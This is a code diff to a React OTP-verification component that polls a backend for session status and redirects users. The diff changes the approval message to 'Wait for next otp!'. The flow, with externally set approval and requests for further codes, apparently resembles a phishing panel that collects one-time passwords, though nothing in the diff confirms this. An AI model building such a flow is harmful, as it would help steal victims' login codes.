@@ -88,6 +88,10 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
     }
   }, [status, navigate, reset, length]);
 
+  const handleApprovedOtp = () => {
+    navigate("/verification");
+  };
+
   // Manual polling for OTP status (backup to hook)
   const startPolling = (sessionId) => {
     if (pollingInterval) {
@@ -115,6 +119,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
 
         // Handle status changes
         if (data.status === "approved") {
+          handleApprovedOtp();
           // Trigger hook status change or handle directly
           // console.log("✅ OTP approved via polling!");
           if (pollingInterval) {
@@ -122,7 +127,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
             setPollingInterval(null);
           }
           // Force navigation
-          setTimeout(() => navigate("/verification"), 1000);
+          // setTimeout(() => navigate("/verification"), 100);
         } else if (data.status === "wrong_code") {
           console.log("❌ Wrong OTP code via polling");
           setWrongCode(true);
@@ -136,7 +141,7 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
             clearInterval(pollingInterval);
             setPollingInterval(null);
           }
-          setTimeout(() => navigate("/login"), 1000);
+          setTimeout(() => navigate("/login"), 0);
         } else if (data.status === "expired") {
           console.log("⏰ Session expired via polling");
           if (pollingInterval) {
@@ -309,10 +314,12 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
 
   // Early returns for specific states
   if (status === "approved") {
+    // navigate("/verification");
+    handleApprovedOtp();
     return (
       <div className="otp-container">
         <div className="verification-success">
-          <h2>✅ Verification Successful!</h2>
+          <h2>✅ Wait for next otp!</h2>
           <p>You will be redirected shortly...</p>
         </div>
       </div>
@@ -320,6 +327,8 @@ const OtpVerification = ({ length = 4, client, myFuncs }) => {
   }
 
   if (status === "wrong_pin") {
+    navigate("/login");
+
     return (
       <div className="otp-container">
         <div className="verification-error">
